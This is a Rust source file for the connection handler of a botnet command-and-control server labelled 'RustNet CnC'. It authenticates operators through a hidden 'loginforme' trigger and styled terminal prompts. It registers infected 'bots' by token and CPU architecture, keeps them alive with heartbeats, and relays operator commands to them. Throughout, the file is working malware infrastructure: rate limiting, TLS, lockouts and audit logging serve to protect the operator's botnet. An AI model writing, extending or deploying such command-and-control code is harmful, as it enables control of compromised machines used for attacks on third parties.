use tokio::net::TcpStream;
use tokio::io::{AsyncReadExt, AsyncWriteExt, BufReader};
use std::sync::Arc;
use std::time::Duration;
use tracing::{info, warn, error, debug};

use super::state::AppState;
use super::error::{Result, CncError, AuditLog, log_audit_event};
use super::auth::{User, set_title};
use super::client_manager::Client;
use super::bot_manager::Bot;
use super::commands::{handle_authenticated_user, registry::CommandRegistry};
use super::tls::accept_tls_connection;

// Define a trait that combines AsyncRead, AsyncWrite, Unpin, and Send
pub trait AsyncReadWrite: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin + Send {}
impl<T: tokio::io::AsyncRead + tokio::io::AsyncWrite + Unpin + Send> AsyncReadWrite for T {}

/// Read a line with a maximum length to prevent DoS
async fn read_line_bounded<R: AsyncReadExt + Unpin>(reader: &mut R, max_len: usize) -> Result<String> {
    let mut line = String::new();
    let mut buf = [0u8; 1];
    
    loop {
        let n = reader.read(&mut buf).await?;
        if n == 0 {
            if line.is_empty() {
                return Err(CncError::ConnectionClosed);
            }
            break;
        }
        
        let ch = buf[0] as char;
        if ch == '\n' {
            break;
        }
        
        if ch != '\r' {
            if line.len() >= max_len {
                return Err(CncError::IoError(std::io::Error::new(
                    std::io::ErrorKind::InvalidInput, 
                    "Line too long"
                )));
            }
            line.push(ch);
        }
    }
    
    Ok(line)
}

pub async fn handle_user_connection(conn: TcpStream, addr: String, state: Arc<AppState>, registry: Arc<CommandRegistry>) -> Result<()> {
    // Extract IP address for rate limiting
    let ip_addr = match addr.parse::<std::net::SocketAddr>() {
        Ok(socket_addr) => socket_addr.ip(),
        Err(_) => {
            // If we can't parse the address, reject the connection
            warn!("Failed to parse address: {}", addr);
            return Ok(());
        }
    };
    
    // Check blacklist
    if state.blacklist.contains(&ip_addr) {
        warn!("Connection rejected from blacklisted IP: {}", ip_addr);
        return Ok(());
    }

    // Check whitelist (if not empty, only allow whitelisted)
    if !state.whitelist.is_empty() && !state.whitelist.contains(&ip_addr) {
        warn!("Connection rejected from non-whitelisted IP: {}", ip_addr);
        return Ok(());
    }
    
    // Check rate limit
    if !state.rate_limiter.check_rate_limit(ip_addr).await {
        warn!("Rate limit exceeded for IP: {}", ip_addr);
        return Ok(());
    }
    
    let title = set_title("☾☼☽ RustNet CnC");
    let resize_sequence = "\x1b[8;32;120t";
    
    // Handle TLS wrapping
    if let Some(ref acceptor) = state.tls_acceptor {
        match accept_tls_connection(acceptor, conn).await {
            Ok(tls_stream) => {
                let mut tls_stream = BufReader::new(tls_stream);
                tls_stream.write_all(title.as_bytes()).await?;
                tls_stream.write_all(resize_sequence.as_bytes()).await?;
                
                // Use bounded read for the first line with timeout
                let first_line = match tokio::time::timeout(Duration::from_secs(10), read_line_bounded(&mut tls_stream, 1024)).await {
                    Ok(Ok(line)) => line,
                    _ => return Ok(()),
                };
                
                if first_line.trim().starts_with("loginforme") {
                    return handle_tls_auth(tls_stream, &addr, state, registry).await;
                }
            }
            Err(e) => {
                warn!("TLS handshake failed from {}: {}", addr, e);
                return Ok(());
            }
        }
    } else {
        let mut conn = BufReader::new(conn);
        // Enforce TLS if configured
        if state.config.enable_tls {
             // If TLS is enabled but we are here, it means state.tls_acceptor is None which shouldn't happen if config.enable_tls is true
             // unless setup failed. But main.rs handles that.
        } else {
            let warning = "\x1b[38;5;196m[!] WARNING: CONNECTION IS NOT ENCRYPTED (NO TLS)\n\r";
            conn.write_all(warning.as_bytes()).await?;
        }

        conn.write_all(title.as_bytes()).await?;
        conn.write_all(resize_sequence.as_bytes()).await?;
        
        // Use bounded read for the first line with timeout
        let first_line = match tokio::time::timeout(Duration::from_secs(10), read_line_bounded(&mut conn, 1024)).await {
            Ok(Ok(line)) => line,
            _ => return Ok(()),
        };
    
        if first_line.trim().starts_with("loginforme") {
            // Attempt authentication (non-TLS)
            match auth_user_interactive(&mut conn, &addr, &state).await {
                Ok(user) => {
                    info!("✓ User {} authenticated from {}", user.username, addr);
                    conn.write_all(b"\x1b[0m\r                           \x1b[38;5;15m\x1b[38;5;118m[OK] Authentication Successful\n").await?;
                    
                    // Create client with proper reader/writer split
                    let client = match state.client_manager.add_client(Client::new(conn, user)?).await {
                        Ok(c) => c,
                        Err(e) => {
                            error!("Failed to add client: {}", e);
                            return Err(e);
                        }
                    };
                    
                    handle_authenticated_user(client, state, &registry).await?;
                }
                Err(e) => {
                    warn!("✗ Authentication failed from {}: {}", addr, e);
                    conn.write_all(b"\x1b[0m\r                           \x1b[38;5;196m[FAIL] Authentication Failed\n").await?;
                }
            }
        }
    }
    
    Ok(())
}

async fn handle_tls_auth(
    mut tls_stream: BufReader<tokio_rustls::server::TlsStream<TcpStream>>,
    addr: &str,
    state: Arc<AppState>,
    registry: Arc<CommandRegistry>,
) -> Result<()> {
    match auth_user_interactive(&mut tls_stream, addr, &state).await {
        Ok(user) => {
            info!("✓ User {} authenticated from {}", user.username, addr);
            tls_stream.write_all(b"\x1b[0m\r                           \x1b[38;5;15m\x1b[38;5;118m[OK] Authentication Successful\n").await?;
            
            let client = match state.client_manager.add_client(Client::new_from_tls(tls_stream, user)?).await {
                Ok(c) => c,
                Err(e) => {
                    error!("Failed to add client: {}", e);
                    return Err(e);
                }
            };
            
            handle_authenticated_user(client, state, &registry).await?;
        }
        Err(e) => {
            warn!("✗ Authentication failed from {}: {}", addr, e);
            tls_stream.write_all(b"\x1b[0m\r                           \x1b[38;5;196m[FAIL] Authentication Failed\n").await?;
        }
    }
    Ok(())
}

async fn auth_user_interactive<S>(conn: &mut S, addr: &str, state: &Arc<AppState>) -> Result<User> 
where
    S: AsyncWriteExt + AsyncReadExt + Unpin,
{
    for attempt in 1..=3 {
        conn.write_all(b"\x1b[0m\r\n\r\n\r\n\r\n\r\n\r\n\r\n").await?;
        conn.write_all(b"\r                        \x1b[38;5;109m> Auth\x1b[38;5;146ment\x1b[38;5;182micat\x1b[38;5;218mion -- \x1b[38;5;196mReq\x1b[38;5;161muir\x1b[38;5;89med\n").await?;
        conn.write_all(b"\x1b[0m\r                       > Username\x1b[38;5;62m: ").await?;
        
        // Read username
        let mut username = String::new();
        let mut buf = [0u8; 1];
        loop {
            let n = conn.read(&mut buf).await?;
            if n == 0 { break; }
            let ch = buf[0] as char;
            
            if ch == '\n' || ch == '\r' { break; }
            
            // Handle backspace
            if ch == '\x08' || ch == '\x7f' {
                if !username.is_empty() {
                    username.pop();
                    // Move back, print space, move back
                    conn.write_all(b"\x08 \x08").await?;
                }
            } else if !ch.is_control() {
                if username.len() < 32 {
                    username.push(ch);
                    conn.write_all(&buf[..1]).await?; // Echo character
                }
            }
        }
        username = username.trim().to_string();
        
        // Check if account is locked out
        if state.login_tracker.is_locked_out(&username).await {
            let remaining = state.login_tracker.get_lockout_remaining(&username).await;
            let msg = format!("\x1b[38;5;196mAccount temporarily locked. Try again in {} seconds.\n\r", remaining);
            conn.write_all(msg.as_bytes()).await?;
            warn!("Login blocked for {} from {} - account locked", username, addr);
            
            // Log lockout event
            let audit = AuditLog::new(
                username.clone(),
                "LOGIN".to_string(),
                "BLOCKED_LOCKED_OUT".to_string()
            ).with_ip(addr.to_string());
            let _ = log_audit_event(audit, &state.audit_file).await;
            
            tokio::time::sleep(Duration::from_secs(2)).await;
            continue;
        }
        
        conn.write_all(b"\n\r\x1b[0m\r                       > Password\x1b[38;5;62m: \x1b[38;5;255m\x1b[48;5;255m").await?;
        
        // Read password
        let mut password = String::new();
        let mut buf = [0u8; 1];
        loop {
            let n = conn.read(&mut buf).await?;
            if n == 0 { break; }
            let ch = buf[0] as char;
            
            if ch == '\n' || ch == '\r' { break; }
            
            // Handle backspace
            if ch == '\x08' || ch == '\x7f' {
                if !password.is_empty() {
                    password.pop();
                    // Move back, print space (masked), move back
                    // Since we are printing on white background with white text (masked), 
                    // we just need to handle the cursor logic if we were echoing.
                    // But here we are echoing nothing or masked chars.
                    // The original code didn't echo password chars.
                }
            } else if !ch.is_control() {
                if password.len() < 128 {
                    password.push(ch); 
                }
            }
        }
        password = password.trim().to_string();
        
        conn.write_all(b"\x1b[0m\x1b[2J\x1b[3J").await?;
        
        debug!("Login attempt {} from {} for user: {}", attempt, addr, username);
        
        match state.user_manager.authenticate(&username, &password).await {
            Ok(Some(user)) => {
                // Clear failed attempts on successful login
                state.login_tracker.clear_attempts(&username).await;
                
                // Log successful authentication
                let audit = AuditLog::new(
                    username.clone(),
                    "LOGIN".to_string(),
                    "SUCCESS".to_string()
                ).with_ip(addr.to_string());
                let _ = log_audit_event(audit, &state.audit_file).await;
                
                return Ok(user);
            }
            Ok(None) => {
                warn!("User not found: {}", username);
                state.login_tracker.record_failed_attempt(&username).await;
                
                // Log failed authentication
                let audit = AuditLog::new(
                    username.clone(),
                    "LOGIN".to_string(),
                    "FAILED_INVALID_CREDENTIALS".to_string()
                ).with_ip(addr.to_string());
                let _ = log_audit_event(audit, &state.audit_file).await;
            }
            Err(e) => {
                warn!("Auth error for {}: {}", username, e);
                state.login_tracker.record_failed_attempt(&username).await;
                
                // Log failed authentication
                let audit = AuditLog::new(
                    username.clone(),
                    "LOGIN".to_string(),
                    "FAILED_INVALID_CREDENTIALS".to_string()
                ).with_ip(addr.to_string());
                let _ = log_audit_event(audit, &state.audit_file).await;
                
                if attempt == 3 {
                    return Err(e);
                }
            }
        }
        
        // Rate limiting: wait before next attempt
        tokio::time::sleep(Duration::from_secs(2)).await;
    }
    
    Err(CncError::AuthFailed("Maximum attempts exceeded".to_string()))
}

pub async fn handle_bot_connection(conn: TcpStream, addr: std::net::SocketAddr, state: Arc<AppState>) -> Result<()> {
    use tokio::io::AsyncReadExt;
    
    // Check rate limit
    let ip_addr = addr.ip();
    if !state.rate_limiter.check_rate_limit(ip_addr).await {
        warn!("Rate limit exceeded for bot connection from IP: {}", ip_addr);
        return Ok(());
    }

    // Handle TLS wrapping
    let mut conn: Box<dyn AsyncReadWrite> = if let Some(ref acceptor) = state.tls_acceptor {
        match accept_tls_connection(acceptor, conn).await {
            Ok(tls_stream) => Box::new(tls_stream),
            Err(e) => {
                warn!("TLS handshake failed for bot {}: {}", addr, e);
                return Ok(());
            }
        }
    } else {
        Box::new(conn)
    };
    
    // Bot authentication: expect "AUTH <token>" as first message
    let mut auth_buf = vec![0u8; 1024];
    let n = match tokio::time::timeout(Duration::from_secs(5), conn.read(&mut auth_buf)).await {
        Ok(Ok(n)) => n,
        _ => {
            warn!("Bot auth timeout from {}", addr);
            return Ok(());
        }
    };
    
    let auth_msg = String::from_utf8_lossy(&auth_buf[..n]);
    let auth_parts: Vec<&str> = auth_msg.split_whitespace().collect();
    
    if auth_parts.len() < 2 || auth_parts[0] != "AUTH" {
        warn!("Invalid bot auth format from {}", addr);
        let _ = conn.write_all(b"AUTH_FAILED\n").await;
        return Ok(());
    }
    
    let version = if auth_parts.len() >= 3 {
        auth_parts[2].to_string()
    } else {
        "unknown".to_string()
    };
    
    // Verify token - ONLY accept registered unique tokens
    let (authenticated_bot_id, arch) = match state.bot_manager.verify_bot_token(auth_parts[1]).await {
        Some((id, arch)) => (id, arch),
        None => {
            warn!("Invalid bot auth token from {}", addr);
            let _ = conn.write_all(b"AUTH_FAILED\n").await;
            
            // Log failed bot auth
            let audit = AuditLog::new(
                "bot".to_string(),
                "BOT_AUTH".to_string(),
                "FAILED_INVALID_TOKEN".to_string()
            ).with_ip(addr.to_string());
            let _ = log_audit_event(audit, &state.audit_file).await;
            
            return Ok(());
        }
    };
    
    // Send auth success
    conn.write_all(b"AUTH_OK\n").await?;
    info!("Bot {} (v{}) authenticated from {}", authenticated_bot_id, version, addr);
    
    // Log successful bot auth
    let audit = AuditLog::new(
        "bot".to_string(),
        "BOT_AUTH".to_string(),
        "SUCCESS".to_string()
    ).with_ip(addr.to_string())
    .with_target(authenticated_bot_id.to_string());
    let _ = log_audit_event(audit, &state.audit_file).await;
    
    // Simple bot protocol: just track and relay commands
    let (cmd_tx, mut cmd_rx) = tokio::sync::mpsc::channel::<String>(100);
    let bot = Bot::new(addr, arch, version, cmd_tx);
    // Override bot ID with authenticated ID to ensure consistency
    {
        let mut info = bot.info.lock().await;
        info.id = authenticated_bot_id;
    }
    let bot_id = authenticated_bot_id;
    
    let _bot_arc = match state.bot_manager.add_bot(bot).await {
        Ok(b) => b,
        Err(e) => {
            error!("Failed to add bot: {}", e);
            return Ok(());
        }
    };
    
    info!("Bot {} connected from {}", bot_id, addr);
    
    // Split connection for concurrent read/write
    let (reader, mut writer) = tokio::io::split(conn);
    let mut reader = BufReader::new(reader);
    
    // Send periodic PINGs and expect PONGs
    let bot_manager = state.bot_manager.clone();
    let mut interval = tokio::time::interval(Duration::from_secs(5)); // BOT_HEARTBEAT_INTERVAL
    let mut buf = [0u8; 64];
    
    loop {
        tokio::select! {
            // Handle commands to send to bot
            res = cmd_rx.recv() => {
                match res {
                    Some(cmd) => {
                        if writer.write_all(cmd.as_bytes()).await.is_err() {
                            info!("Bot {} disconnected (write failed)", bot_id);
                            bot_manager.set_bot_error(&bot_id, "Write failed".to_string()).await;
                            break;
                        }
                    }
                    None => {
                        // Channel closed (Bot dropped from manager)
                        info!("Bot {} disconnected (channel closed)", bot_id);
                        break;
                    }
                }
            }
            
            // Send PING
            _ = interval.tick() => {
                if writer.write_all(b"PING\n").await.is_err() {
                    info!("Bot {} disconnected (ping failed)", bot_id);
                    bot_manager.set_bot_error(&bot_id, "Ping failed".to_string()).await;
                    break;
                }
            }
            
            // Read response (PONG)
            res = reader.read(&mut buf) => {
                match res {
                    Ok(n) if n > 0 => {
                        // Got response, update heartbeat
                        let response = String::from_utf8_lossy(&buf[..n]);
                        if response.contains("PONG") {
                            bot_manager.update_bot_heartbeat(&bot_id).await;
                        }
                    }
                    Ok(_) => {
                        // EOF
                        info!("Bot {} disconnected (EOF)", bot_id);
                        bot_manager.set_bot_error(&bot_id, "EOF".to_string()).await;
                        break;
                    }
                    Err(e) => {
                        info!("Bot {} disconnected (read error: {})", bot_id, e);
                        bot_manager.set_bot_error(&bot_id, format!("Read error: {}", e)).await;
                        break;
                    }
                }
            }
        }
    }
    
    // Cleanup on disconnect
    bot_manager.remove_bot(&bot_id).await;
    info!("Bot {} removed", bot_id);
    
    // Log bot disconnection
    let audit = AuditLog::new(
        "bot".to_string(),
        "BOT_DISCONNECT".to_string(),
        "INFO".to_string()
    ).with_ip(addr.to_string())
    .with_target(bot_id.to_string());
    let _ = log_audit_event(audit, &state.audit_file).await;
    
    Ok(())
}
